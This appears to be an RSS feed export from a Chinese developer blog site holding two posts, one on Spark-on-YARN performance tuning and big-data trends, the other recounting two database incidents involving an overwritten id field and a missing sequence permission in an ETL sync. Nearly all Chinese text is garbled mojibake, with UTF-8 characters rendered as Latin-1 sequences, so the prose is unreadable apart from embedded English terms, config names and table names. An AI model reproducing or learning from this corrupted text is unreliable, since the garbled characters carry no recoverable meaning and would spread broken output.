<?xml version="1.0" encoding="UTF-8" ?>
    <rss version="2.0">
    <channel>
        <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
        <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
        <lastBuildDate>2026-01-17T20:18:24.827Z</lastBuildDate>
        <description><![CDATA[
        ä¸»é¡µ - åå®¢å­ RSS
    ]]></description>
        <language>zh-cn</language>
        <item>
    <title><![CDATA[ å¤§æ°æ®ææ¯é¢ååå±ä¸Sparkçæ§è½ä¼å ]]></title>
    <link>https://www.cnblogs.com/zzq6032010/p/19497421</link>
    <guid>547cd41f541f5442e157ae6f27b68b70</guid>
    <description>
    <![CDATA[ 
	<h1 class="postTitle"><a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/zzq6032010/p/19497421" title="åå¸äº 2026-01-17 23:59">
    <span role="heading" aria-level="2">å¤§æ°æ®ææ¯é¢ååå±ä¸Sparkçæ§è½ä¼å</span>
    

</a>
</h1>
	<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><strong><span style="font-size: 15px">ä¸ãå¤§æ°æ®ææ¯é¢ååå±æ¹å</span></strong></p>
<p>éçAIæ¶ä»£çå°æ¥ï¼å¤§æ°æ®ææ¯é¢åéæ¸éå±äºçº¿ï¼åä¹æ²¡æäºåäºå¹´çéè§ç¨åº¦ãåä¸»è¿æç»åä»ä¸å¤å¹´ç»éªï¼å¯¹å¤§æ°æ®ææ¯é¢åçææ¯æ¼è¿è·¯çº¿åä¸æ¢³çã</p>
<p>å½åå¤§æ°æ®é¢ååå±å·²ç»è¿å¥æ·±æ°´åºï¼éçåç§æçå¤§æ°æ®æ¡æ¶çåºç¨æ®åï¼é¾ç¹å·²ç»ä»å­ä¸ä¸ãç®ä¸åºï¼åä¸ºäºå¦ä½é«è´¨éãé«æè®¡ç®æ°æ®å¹¶å¢å æ°æ®ä¸ä»·å¼çè½¬æ¢çï¼è¿å°±æ¶åå°éå¯¹ä»·å¼åç°åºæ¯çæ°æ®è®¾è®¡åå¨çå½å¨æçç®¡çãè¿é¨åæ ¹æ®å·ä½ä¸å¡åºæ¯çå·®å¼ï¼è®¾è®¡å®ç°åå·®ä¸å«ï¼æ¬æä»¥Spark On Yarnç»å¸å¤§æ°æ®éç¾¤åºæ¯ä¸ºä¾ï¼è®²ä¸è®²å¦ä½é«æè®¡ç®æ°æ®ã</p>
<p>&nbsp;</p>
<p><strong><span style="font-size: 15px">äºãSpark On Yarnæ§è½ä¼åæè·¯</span></strong></p>
<p><strong><span style="font-size: 14px">1ãSparkè°å</span></strong></p>
<p>Sparkå¼æ¾äºä¼å¤è¿ç¨åæ°ï¼æ¥æ§å¶éç¾¤è¿è¡è¿ç¨ä¸­åä¸ªç»´åº¦çè®¾ç½®ãå¸¸ç¨æ¥åæ°è°ä¼çæï¼</p>
<p>spark.default.parallelismï¼å¹¶è¡åº¦</p>
<p>spark.sql.shuffle.partitionsï¼shuffleååºæ°ï¼å¸¸ä¸ºéç¾¤Executoræ ¸å¿æ°ç2-3åï¼</p>
<p>spark.executor.memoryOverheadï¼è°èshuffleè¿ç¨ä¸­åå­æº¢åºéå¼</p>
<p>spark.dynamicAllocation.enabled=trueï¼å¯ç¨å¨æèµæºåéï¼ä»»å¡è´è½½é«æ¶å¯èªè¡å¢å å¯¹èµæºçç³è¯·</p>
<p>spark.sql.adaptive.enabled=trueï¼å¼å¯AQEï¼èªå¨è°èæä¼ååºæ°ï¼è¿å¯æ¹åæ°æ®å¾æé®é¢</p>
<p>ä¸é¢åªæ¯ä¾ä¸¾å¶ä¸­ä¸å°é¨åï¼åæ°è°åéåSparkUIä½¿ç¨ï¼æ¹ä¾¿è§æµè°æ´ææã</p>
<p><strong>2ãä»£ç ç«¯ä¼å</strong></p>
<p>ææ®µå¾å¤ï¼åæ¬ä½ä¸éäºï¼å¢å ç¼å­ãåå°udfçä½¿ç¨ãèµ°dataframeæsparksqlæå¤§åå©ç¨sparkåççå¼æä¼åãä½¿ç¨broadcastç­ï¼æ ¸å¿ååæ¯å¤å©ç¨sparkä¼åæºå¶ï¼åå¥½æ°æ®ç¼å­ã</p>
<p><strong>3ãæ°æ®ç«¯ä¼å</strong></p>
<p>æ°æ®ç«¯ä¼åä¸»è¦æ¯ä¸¤é¨åï¼</p>
<p>ç¬¬ä¸æ¯è¯»åãå­å¨æ¶ï¼éç¨é«æå­å¨æ ¼å¼ï¼å¦parquetãORCç­ï¼å¤©ç¶éésparkçååºè®¡ç®æ¨¡å¼ï¼ä¼åå°å¾å¤æ è°çæä½ã</p>
<p>ç¬¬äºæ¯éç¨é«æåºååæ¹å¼ï¼åå°shuffleè¿ç¨ä¸­çåºååèæ¶ï¼è¿é¨åæ¶é´å¯å¨SparkUIçStageå¤æ¥çtaskçtimelineä¸­çå¯¹åºèæ¶ã</p>
<p><strong>4ãæ¶æå±ä¼å</strong></p>
<p>ä¸è¿°æªæ½é½åå®ä¹åï¼åºæ¬å°±è¿å¥äºæ§è½ä¼åçæ·±æ°´åºï¼å½åä¸çæçåæ³æä¸¤å¤§ç±»ï¼åè½è¿ä¸æ­¥çªç ´æ°æ®è®¡ç®ç¶é¢å¯å¸¦æ¥è¾å¤§å¹åº¦æåã</p>
<p><span style="color: rgba(0, 0, 255, 1)"><strong>ç¬¬ä¸æ¯å©ç¨åéåææ¯ï¼å¤§å¹æåè®¡ç®æçã</strong></span></p>
<p>åéåææ¯è½æææçåºç¡ï¼å¨äºç°ä»£è®¡ç®æºå¯¹SIMDæä»¤çæ¯æã</p>
<p>SIMDæä»¤ï¼å³åæä»¤æµå¤æ°æ®æµ Single Instruction Multiple Dataï¼å¨è®¡ç®æºä¸­å¯ä»¥ä½¿ç¨ä¸æ¡æä»¤ï¼ä¼ éå¤ä¸ªæ°æ®è¿å»ï¼å³åéï¼ï¼èåCPUä»éå¯¹è¿ä¸ä¸ªåéè¿è¡ä¸æ¬¡è¿ç®ï¼æ¯å¦å½åè¦è¿è¡å æ³è¿ç®ï¼ï¼å³å¯å¾å°ç»æï¼ç¸æ¯ä¼ ç»CPUä¸ä¸ªå æ³è°ç¨ä¸æ¬¡æä»¤çæ¹å¼ï¼å¿«äºNï¼Nä¸ºåéçé¿åº¦ï¼åã</p>
<p>æä»¥åéåæ¹é æ¯ä¸æ¡çè®ºä¸å·å¤é«æææè½åçææ¯æ¹åãå·ä½å®æçè¯ï¼å¼æºç»ä»¶æ¨èä½¿ç¨Glutenï¼å°ç±³ææ¯å¢éå»å¹´åè¿å®è·µåäº«ï¼æ¹é ä¹åæ¶é´èæ¶å¹³åéä½30%ã</p>
<p><strong><span style="color: rgba(0, 0, 255, 1)">ç¬¬äºæ¯å¨å¹¶è¡è®¡ç®è·¯ä¸ç»§ç»­çå¥ï¼å¼å¥å¼æçGPU</span></strong>ï¼æ³¨æä¸æ¯NPUï¼NPUä»ä¸ºæ¯æAIè®­ç»æ¨çå éï¼å¯¹éç¨æ°æ®è®¡ç®å¢çææå¹¶ä¸å¥½ï¼ä¸ç¼ºå°éå¥ï¼ã</p>
<p>å¨GPUè®¡ç®ææè¿åï¼è±ä¼è¾¾ä¸é¨ä¸ºSparkæ ç¼ä½¿ç¨å¼åäºRAPIDSå éå¨æä»¶ãå®å¯ä»¥ä»¥æä»¶çæ¹å¼éæå°sparkå®¢æ·ç«¯ä¸­ï¼éè¿åæ°å¼å³æå®å¯ç¨ãå¨sparkçç©çè®¡åçæä¹åï¼ä¼è¢«è¯¥å éå¨æä»¶æ¦æªï¼å°å¶ä¸­çCPUç®å­æ¿æ¢ä¸ºGPUç®å­ï¼è¥è¯ä¼°å éææä¸å¥½è¿å¯éåæCPUç®å­ï¼ï¼èåå¨Taskæ§è¡é¶æ®µï¼RAPIDSä¼æ¥è¿è¯¥ä»»å¡è¿è¡æ§è¡ã</p>
<p>å¤§ä½ï¼å°±è¿äºäºãåçº¯çå¤§æ°æ®ææ¯é¢åï¼å¯åçæ°ææ¯æ¼è¿å·²ç»ä¸å¤äºï¼åé¢æ´å¤çæ¯å¦ä½ç²¾ç»åä»·å¼è½¬æ¢ï¼ç»AIç»è¡ä¸èµè½ã</p>
<p>åç»­å°æ²¿çAIçæ¹åï¼è¿è¡åæçæ´æ°åå­¦ä¹ ã</p>
</div>
<div class="clear"></div>

	<div class="postDesc">posted on 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-17 23:59">2026-01-17 23:59</span>&nbsp;
<a href="https://www.cnblogs.com/zzq6032010">æ·¡å¢¨ç</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19497421);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19497421', targetLink: 'https://www.cnblogs.com/zzq6032010/p/19497421', title: 'å¤§æ°æ®ææ¯é¢ååå±ä¸Sparkçæ§è½ä¼å' })">ä¸¾æ¥</a>
</div>
 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ æè¿éå°çä¸¤ä¸ªææ¯é®é¢è®°å½ ]]></title>
    <link>https://www.cnblogs.com/grey-wolf/p/19495709</link>
    <guid>a4080a8c88e11b5629057f92961d3534</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/grey-wolf/p/19495709" title="åå¸äº 2026-01-17 12:23">
    <span role="heading" aria-level="2">æè¿éå°çä¸¤ä¸ªææ¯é®é¢è®°å½</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="é®é¢1">é®é¢1</h1>
<h2 id="èæ¯">èæ¯</h2>
<p>æä¸ªä¾åé¨åå·¥ä½¿ç¨çåå°ç®¡çç³»ç»ï¼æ¯å¤©ä¼ä»ä¸æ¸¸çä¸ä¸ªoaç³»ç»çæ¥å£åæ­¥åå·¥æ°æ®ï¼oaç³»ç»ä¾§ç»´æ¤äºæ¯ä¸ªåå·¥çidãåç§°ãå·¥ä½åå¸ç­ç­åç±»ä¿¡æ¯ï¼æ¥å£ååºå¦ä¸ï¼</p>
<p><img src="https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117104211631.png" alt="image-20260117104211631" loading="lazy"></p>
<p>è¿ä¸ªidå°±ç®æ¯åå·¥çå¯ä¸æ è¯ï¼å°±åå·¥å·ä¸æ ·ï¼ä¸ä¼åçé£ç§ãå æ­¤ï¼æä»¬ææ¥å£æ°æ®æ¿å°åï¼å°±ç´æ¥è½å°å°æä»¬æ¬å°æ°æ®åºçè¡¨ä¸­ï¼è¡¨çä¸»é®è½ç¶è®¾å®ä¸ºèªå¢ä¸»é®ï¼ä½æ¯å¨ç¨åºéï¼æä»¬ä¼ç´æ¥ç¨oaç³»ç»ç»æä»¬çè¿ä¸ªidæ¥è®¾ç½®æ¬å°è¡¨idçå¼ååæå¥ã</p>
<p><img src="https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117105119562.png" alt="image-20260117105119562" loading="lazy"></p>
<p>è¡¨ç»æï¼</p>
<p><img src="https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117122224831.png" alt="image-20260117122224831" loading="lazy"></p>
<p>sqlå¦ä¸ï¼è¿ä¸ªsqlæ¯èªå¨çæçï¼é»è®¤çæåºæ¥çæ¯ä¸å¸¦idè¿ç§ä¸»é®å­æ®µçï¼æä»¬æå¨å äºä¸ä¸ï¼</p>
<p><img src="https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117105019010.png" alt="image-20260117105019010" loading="lazy"></p>
<p>æå¨å ä¸idå­æ®µï¼</p>
<p><img src="https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117104906664.png" alt="image-20260117104906664" loading="lazy"></p>
<p>ç»æï¼æè¿å¼äºä¸ä¸ªåå·¥æ¥åä¸ä¿é©çæ´»å¨ï¼ç®åæ¥è¯´ï¼å°±æ¯å­å¨ä¸ä¸æ°æ®ï¼ç¨æ·id ãå¯¹åºçåä¸ä¿é©idã</p>
<p>æ¥ä¿é©çè¿ç¨ä¸­ï¼åç°ç¨æ·è¡¨ç¼ºäºäºæ°æ®æ²¡åæ­¥ï¼å¦ç¨æ·è¯ä»¶å·ï¼æ¥ä¿é©éè¦ï¼ãåå¸ç­ï¼æä»¥å°±å äºä¸ä¸è¿å ä¸ªå­æ®µã</p>
<p><img src="https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117105522469.png" alt="image-20260117105522469" loading="lazy"></p>
<p>æ°å¢å®å­æ®µåï¼mapper.xmlä»£ç èªå¨çæï¼ä¹æ²¡ä»ç»çï¼ç»æå°±æä¹åæå¨å çidå­æ®µç»å²æäºï¼</p>
<p><img src="https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117105645320.png" alt="image-20260117105645320" loading="lazy"></p>
<p>è¿ä¸ªä¸çº¿åï¼ç±äºå¨ç¨åºä¸­æ²¡ææå®idå­æ®µï¼å°±å¯¼è´æ¬å°è¡¨ä¸­çidåæäºä½¿ç¨èªå¢çæ¹å¼ï¼postgresqlï¼ä»åºåä¸­è·åä¸ä¸ä¸ªidçå¼ï¼ç±»ä¼¼mysqlä¸­èªå¢ï¼ã</p>
<p>èä¸ï¼ä»oaç³»ç»åæ­¥åå·¥ä¿¡æ¯å°ææ¹ç³»ç»ï¼æ¯å¤©é½æ¯é ä¸ä¸ªå®æ¶ä»»å¡å¨è·ï¼æ¯å¤©è·çæ¶åï¼</p>
<pre><code class="language-shell">1ãä»oaä¾§è·ååå·¥åè¡¨æ°æ®
2ãæ¸ç©ºæ¬å°è¡¨
3ãæ¹éæå¥ä»oaä¾§è·åçåå·¥æ°æ®
</code></pre>
<p>è¿å°±å¯¼è´ï¼åå·¥çidï¼ä¸çº¿åï¼æ¯å¤©é½å¨åï¼æ¯å¤©é½å¨åã</p>
<p>å½æ¶ææ¥é®é¢çå°è¿ä¸ªé®é¢çæ¶åï¼åäºä¸è·³ï¼å½æ¶åå·¥æ¥åä¸ä¿é©æ­£å¦ç«å¦è¼å¢ï¼æä¸æ³ï¼é¾éå¾èµ¶ç´§éç¥å¨å¬å¸çäººï¼éæ°æ¥äºï¼èä¸ï¼å½æ¶ä¸å¡çäººåä¿é©å¬å¸çº¦å®çæä¾ä¿é©äººåååçæ¶é´ä¹æ²¡å å¤©äºããã</p>
<p>åé¢æåä»ç»çäºä¸ï¼åç°é®é¢è¿æ²¡æé£ä¹å¤§ã</p>
<p>å°±æ¯å¨æ°æ®åè½å°å°t_user_syncè¿ä¸ªè¡¨ï¼è¿ä¸ªè¡¨åä¸æ¸¸oaä¾§æ°æ®ä¿æä¸æ¨¡ä¸æ ·ï¼åªè¯»ä¸åï¼ä¾¿äºå®ä½é®é¢ï¼åï¼è¿æä¸ªå®æ¶ä»»å¡ï¼å°æ°æ®ä»t_user_syncè½¬ç§»å°æä»¬å®éçç¨æ·è¡¨ï¼sy_userï¼ï¼è¿ä¸ªè¡¨æä»¬ä¼è¿è¡å¢å æ¹æ¥ç­ç­ã</p>
<p><img src="https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117110408095.png" alt="image-20260117110408095" loading="lazy"></p>
<p>è¿ä¸ªå®æ¶ä»»å¡ï¼å¨å°t_user_syncè½¬ç§»å°sy_userçè¿ç¨ä¸­ï¼æ¯å¢éåæ­¥çãå¦ï¼åç°zhangsanè¿ä¸ªç¨æ·æ¶ï¼åæ¥ä¸ä¸sy_useréææ²¡æï¼æ²¡æææå¥ï¼æå¥æ¶ï¼sy_userçidä¹æ¯ç¨çt_user_syncçidï¼ä¹å°±æ¯oaä¾§çidï¼ï¼æå°±æ´æ°ã</p>
<p>è¿ä¸ªå¢éåæ­¥æºå¶ï¼æäºæï¼å¯¼è´çç»ææ¯ï¼è½ç¶t_user_syncä¸­idéäºï¼ä¸æ¯å¤©é½å¨åï¼ä½sy_userä¸­çidè½ç¶ä¹æ¯éçï¼ä½æ¯ä¸ä¼æ¯å¤©åï¼èæ¯ç¨å°ç¬¬ä¸æ¬¡åæ­¥t_user_syncæ¶çidã</p>
<p>åªè¦sy_userè¡¨ä¸­çidä¸åï¼éçä¹å½±åä¸å¤§ï¼è³å°åå·¥æ¥ä¿é©çç¸å³è¡¨ä¸­çå³èå³ç³»æ¯æ²¡é®é¢çï¼</p>
<p>åå·¥id          åå·¥åç§°    ä¿é©åç§°</p>
<p>11111(éç)  å¼ ä¸         xxxåä¸ä¿é©</p>
<p>èæä»¬è¿ä¸ªç³»ç»ä¸­ï¼å¶ä»å°æ¹ä¹æç¨å°è¿ä¸ªç¨æ·idçï¼è½ç¶ç±äºç¨æ·idååå¯¼è´äºå³èå³ç³»éä¹±ï¼ä½æ¯å½±åæ¯ç«ä¸å¡å½±åæ²¡é£ä¹å¤§ï¼å°æ¶ååä¿®å¤å³å¯ã</p>
<h2 id="æ»ç»">æ»ç»</h2>
<p>å¶å®ï¼è¿ä¸ªé®é¢å°±æ¯ç²å¿é æçï¼å½ç¶ï¼å®¢è§ä¸ï¼ç°å¨æéç³»ç»å¤ªå¤ï¼ç²¾ååæ£ä¹æ¯ä¸ä¸ªåå ã</p>
<p>å¦å¤ï¼è¿ä¸ªèªå¨çæä»£ç çæºå¶ï¼åæççè¿åæ¯å¦å¯ä»¥ä¼åå§ï¼è½æidå­æ®µä¸èµ·çæå°xmlä¸­æ¯æå¥½ã</p>
<p>å¦æå®å¨ä¸è¡çè¯ï¼ä¹åºè¯¥èèï¼è¿ç§è¡¨çidå­æ®µï¼å°±è®¾ç½®ä¸ºéèªå¢ãéç©ºï¼å¿é¡»è®©ç¨åºæå¨è®¾ç½®ï¼ä¹è½åæ¶åç°é®é¢ã</p>
<h2 id="é®é¢2">é®é¢2</h2>
<h2 id="etl">etl</h2>
<p>ä»ç»èæ¯åï¼åè®²è®²etlå§ï¼</p>
<p>å¨æä»ä¸æ²¡å å¹´çæ¶åï¼å½æ¶ç±äºæ¥è§¦çé½æ¯mysqlè¿ç§oltpè¿ç±»ä¸å¡ä¸ºä¸»ï¼ææ¶åçå°ä¸äºæèå²ä½åetlï¼ä¸ç¥éæ¯å¥ææãä¹æ¯è¿å å¹´æå¤§æ¦äºè§£ï¼</p>
<pre><code class="language-shell">å°ä¼ä¸ä¸­åæ£çæ°æ®ï¼éä¸­çè¾å¥å°æ°æ®ä»åºä¸­çè¿ç¨ï¼å°±æ¯ ETLã

Extractï¼æåï¼ï¼ ä»å¤ä¸ªå¼ææ°æ®æºï¼å¦æ°æ®åºãæä»¶ç³»ç»ãAPIç­ï¼ä¸­æååå§æ°æ®ãæ°æ®æºå¯ä»¥æ¯å³ç³»åæ°æ®åºï¼å¦MySQLãPostgreSQLï¼ãéå³ç³»åæ°æ®åºï¼å¦MongoDBãCassandraï¼ãæä»¶ï¼å¦CSVãJSONï¼ãAPIææµå¼æ°æ®æºã

Transformï¼è½¬æ¢ï¼ï¼ å¯¹æåçæ°æ®è¿è¡æ¸æ´ãæ ååãèåãå»éç­æä½ï¼ä»¥æ»¡è¶³ä¸å¡éæ±ææ°æ®åæçè¦æ±ãè¿ä¸æ­¥å¯è½æ¶åæ°æ®ç±»åè½¬æ¢ãæ ¼å¼è½¬æ¢ãä¸å¡è§ååºç¨ãæ°æ®èåãæ°æ®è´¨éæ ¡éªç­ã

Loadï¼å è½½ï¼ï¼ å°è½¬æ¢åçæ°æ®å è½½å°ç®æ å­å¨ç³»ç»ä¸­ï¼éå¸¸æ¯æ°æ®ä»åºææ°æ®æ¹ä¸­ï¼ä¾åç»­çæ°æ®åæãæ¥è¡¨ææºå¨å­¦ä¹ ç­ç¨éãå è½½çæ¹å¼å¯ä»¥æ¯å¨éå è½½ãå¢éå è½½æå®æ¶å è½½ã
</code></pre>
<p><img src="https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117113327615.png" alt="image-20260117113327615" loading="lazy"></p>
<p>åæä»¬å¬å¸ï¼æ°æ®åºç§ç±»åå¤ï¼oracleãmysqlãpgãå½äº§ï¼ï¼ç³»ç»åå¤ï¼å¥½å¤ç³»ç»è¿æ¯ä¹°çï¼ä½ æ³è¦æä¸ªç³»ç»çæ°æ®ï¼è¦ä¹èµ°æ¥å£ï¼è¦ä¹éè¿äººå®¶çè¡¨ãä¸æ¹é¢ï¼å¥½å¤ä¹°çç³»ç»ï¼ä¸åæ¬¢å¯¹å¤æä¾æ¥å£ï¼åä¸ä¸çèèï¼æ¯ç«æ°æ®æ¯æ ä»·çï¼è®©ä½ é¾ä»¥è¿ç§»ï¼ä¹å°±æ¯è¿å å¹´ï¼æè§æ°çè½¯ä»¶ç³»ç»æå¼å§æ³¨éå¯¹å¤æä¾apiï¼ï¼å¦ä¸æ¹é¢ï¼ææ¶åè¡¨å¾å¤ï¼æäºè¡¨ä¹å¾å¤§ï¼èªå·±åæ¥å£å»æ¯å¤©åæ­¥ï¼å·¥ä½éä¹ä¸å°ï¼è¿è¦ç³è¯·api key/api secretï¼è¿è¦å¼éç½ç»ï¼ä¹æ¯æºéº»ç¦çï¼æç»å°±æ¢æ¢ä¹ æ¯äºãå¦¥åäºï¼éè¿æ°ä»etlåæ­¥ï¼è¿æ¯è½çä¸äºäºå§ã</p>
<h2 id="èæ¯-1">èæ¯</h2>
<p>å¦ä¸ä¸ªcç«¯ç³»ç»ï¼éè¦æ§æ¯ä¸é¢é£ä¸ªç³»ç»éè¦å¤äºï¼è¿ä¸¤å¤©ä¹åºäºä¸ä¸ªé®é¢ã</p>
<p>è¿ä¸ªç³»ç»ï¼æ¬æ¥æ¯ä¸ä¸ªå¤ååäºå¨ç»´æ¤ï¼ç±äºä»æå¨çå¬å¸åæä»¬å¬å¸ä¸ååä½äºï¼ä»ä¹å°±è·çç¦»èäºï¼å¶å®å¯ä»¥åæ°å¤åå¬å¸ç­¾çº¦ï¼ä¸è¿ä»è¯´æ°å¤åå¬å¸ä¸å¤ªåæ¬¢ï¼ãä»å¼åå®æäºæåä¸ä¸ªåè½å¹¶å®ææµè¯åï¼è¿æ²¡æ¥å¾åç³»ç»ä¸çº¿ï¼æä»¥ä¸çº¿çäºå°±ææ¥å¼ã</p>
<p>ææ´çäºä¸ä¸ä¸çº¿çåç§åæ´ï¼å¦sqlãnacoséç½®ãxxljobãçæ¬jaråãåç«¯åç­ç­ä¸å¤§å ï¼åäºä¸ªææ¡£å°±æäº¤åæ´æµç¨äºã</p>
<p>å¶ä¸­ä¸ä¸ªsqlï¼æ¯ç»æä¸ªæ°ä»åæ­¥è¡¨å idå­æ®µï¼å¹¶æ°å»ºäºåºåï¼è®¾ç½®idå­æ®µéè¿åºåæ¥èªå¢ï¼ï¼æå½æ¶è¿ä¸é¨ç ç©¶äºä¸ä¸ï¼</p>
<p>æä»¬æä¸¤ä¸ªè¡¨ï¼jy_sync_h_logasset ï¼å½åè¡¨ï¼ãjy_sync_h_logasset_historyï¼åå²è¡¨ï¼ï¼ä¸¤ä¸ªè¡¨çç»æç±»ä¼¼ï¼åªæ¯ä¸ä¸ªå­å¨æè¿å ä¸ªæçæ°æ®ï¼jy_sync_h_logasset ï¼ï¼ä¸ä¸ªå­å¨å ä¸ªäººåçæ°æ®ï¼jy_sync_h_logasset_historyï¼ãç³»ç»ä¼å®ææå ä¸ªæåçæ°æ®ï¼ä»å½åè¡¨ï¼è½¬ç§»å°åå²è¡¨éå»ï¼ä¿è¯å½åè¡¨çæ°æ®éä¸è¦å¤ªå¤§ï¼å½±åæ¥è¯¢éåº¦ã</p>
<p>è¿ä¸¤ä¸ªè¡¨ï¼æä¸ä¸ªé®é¢ï¼å°±æ¯è¡¨æ²¡æè®¾ç½®idè¿ç§ä¸»é®ï¼ä¸ºå¥æ²¡ä¸»é®å¢ï¼å ä¸ºjy_sync_h_logasset è¿ä¸ªè¡¨çæ°æ®ï¼æ¯éè¿æ°ä»çetlæä½ï¼ä»å¶ä»ä¸æ¸¸æ°æ®åºæ¬è¿è¿æ¥çã</p>
<p>jy_sync_h_logasset å¯¹åºçä¸æ¸¸çè¯ï¼ä¸ä¸å®æ¯ä¸ä¸ªè¡¨ï¼å¯è½æ¯ä¸ä¸ªè§å¾ï¼æèæ¯ä¸ä¸ªsqlï¼æ¯å¦select name,oa_account from employeeè¿ç§ï¼å®çsqlä¸­ï¼å°±æ²¡ææ¥è¯¢idå­æ®µï¼æèæ¯å¤è¡¨joiné£ç§ï¼ä¸å¯¹å¤ï¼ï¼å°±æ¯ç®æidï¼ä¹ä¼å¯¼è´idéå¤ã</p>
<p>æä»¥ï¼æçæµæ¯è¿ä¸ªåå ï¼å¯¼è´ææ¹çè¿ä¸ªè¡¨ï¼æ¯æ²¡æidå­æ®µçï¼ä¹æ²¡å¼ä¸»é®ã</p>
<p>ä¸ä¸ªè¡¨ï¼æ²¡æä¸»é®ï¼æ®ææç¥ï¼å¨åé¡µæ¥è¯¢æ¶ï¼å®¹æä¸ç¨³å®ï¼æä¸æ¡è®°å½å¯è½ä¼å¨è¿ä¸é¡µåºç°ï¼å¨ä¸ä¸é¡µç»§ç»­åºç°ï¼ä¸è¬æä»¬è§£å³è¿ç§åé¡µæ¥è¯¢ä¸ç¨³å®çé®é¢ï¼é½æ¯ä¼æç§æä¸ªå­æ®µæåºï¼èä¸è¬é¦éå°±æ¯idå­æ®µã</p>
<p>å¯¹äºè¿ä¸ªæ²¡æidå­æ®µçè¡¨æ¥è¯´ï¼åé¡µæ¥è¯¢åºè¯¥æ¯å®¹æåºé®é¢çï¼æä»¥æçæµï¼è¿å°±æ¯æ¬æ¬¡sqlåæ´ï¼å idå­æ®µï¼åå»ºåºåï¼è®¾ç½®idå­æ®µä»åºååå¼ï¼çåå ã</p>
<p><img src="https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117115053690.png" alt="image-20260117115053690" loading="lazy"></p>
<p>æå½æ¶ä¸ºå¥æ³¨æè¿ä¸ªsqlå¢ï¼æåç°ä»åªå»ºäºä¸ä¸ªåºåï¼ç¶åä¸¤ä¸ªè¡¨é½ç¨äºè¿ä¸ªåºåï¼æå½æ¶å¤çäºä¸¤ç¼ï¼åªæ¯æç¹å¥æªï¼ä¸è¬æ¥è¯´ï¼æ¯ä¸ªè¡¨ä¼è®¾ç½®ä¸ä¸ªèªå·±çåºåãåæ¥æçå°ï¼å¨å°jy_sync_h_logassetè¡¨ä¸­å ä¸ªæåçæ°æ®è½¬ç§»å°jy_sync_h_logasset_historyçå®æ¶ä»»å¡ä¸­ï¼ä»£ç éè®¾ç½®äºjy_sync_h_logasset_historyçidå°±ç´æ¥ä½¿ç¨jy_sync_h_logassetä¸­çidï¼ä¹å°±æ¯è¯´ï¼jy_sync_h_logasset_historyå®éå¹¶ä¸ä¼ä½¿ç¨åºåä¸­çå¼ä½ä¸ºidï¼æä¹å°±æ²¡ç®¡äºãå½ç¶ï¼åºäºçç¡®å®ä¹ä¸æ¯è¿ä¸ªé®é¢ã</p>
<p>å¨åä¸åï¼åè¿ç»´ä¸åï¼ççä»åå®ä¸çº¿åæ´ï¼æ³çåäºäºä¸ä¸ªäºãç»æå¨äºæ©ä¸ï¼8ç¹å¤ï¼å°±ç»æåæ¶æ¯ï¼è¯´æä¸ªxxljobçå®æ¶ä»»å¡å¤±è´¥äºã</p>
<p>æèµ¶ç´§åå®é¥­ï¼æ±ççµèå»æ¾ä»ï¼çäºä¸ï¼åç°æ¥éçåå æ¯ï¼</p>
<p>ä¸ä¸ªetl_statusçè¡¨ä¸­ï¼æ²¡ææ¥å°å½å¤©çè®°å½ï¼è¿ä¸ªè¡¨çç¨éæ¯ï¼æ°ä»å¨ç»æä»¬æ¨éå®åä¸ªè¡¨çæ°æ®åï¼ä¼å¨etl_statusä¸­åå¥ä¸æ¡æåè®°å½ã</p>
<p>æ¢ç¶è¿æ¬¡æ¥éæ¯æ²¡æ¥å°æ°ä»åçæåè®°å½ï¼æ¯ä¸æ¯æ°æ®æ¨éå¤±è´¥äºå¢ï¼æä»¬èµ¶ç´§èç³»äºæ°ä»çåäºï¼æ°ä»åäºè¿äºä¼åè¯æä»¬è¯´ï¼æ¯æ°ä»å¨å¾jy_sync_h_logassetåè®°å½æ¶ï¼æ¥éäºï¼æç¤ºå¯¹jy_sync_h_logasset_pkè¿ä¸ªåºåçæéä¸è¶³ãç¶åæè¿å»æ¾ä»ï¼ä»ç»èäºä¸ï¼æ¯å¦ï¼ä»é£è¾¹çä¸æ¬¡æ°ä»etlä»»å¡ï¼æ»å±è¦æ¨10ä¸ªè¡¨è¿æ¥ï¼å¦æå¶ä¸­ä¸ä¸ªè¡¨å¤±è´¥äºï¼å°±ä¼å¯¼è´ï¼ä¸åå¥etl_statusæåè®°å½ãä½å·²ç»æ¨éæåçè¡¨ï¼å¦è¿éæåäº9ä¸ªè¡¨ï¼çæ°æ®å¹¶ä¸ä¼åéã</p>
<p>é®é¢æ¯ææ¸æ¥äºï¼è¿æ¯ç²å¿å¯¼è´çï¼æå½æ¶å®å¨æ²¡ææ³èµ·æ¥åºåè¦ç»æ°ä»ç¨æ·ææè¿ä¸ªäºã</p>
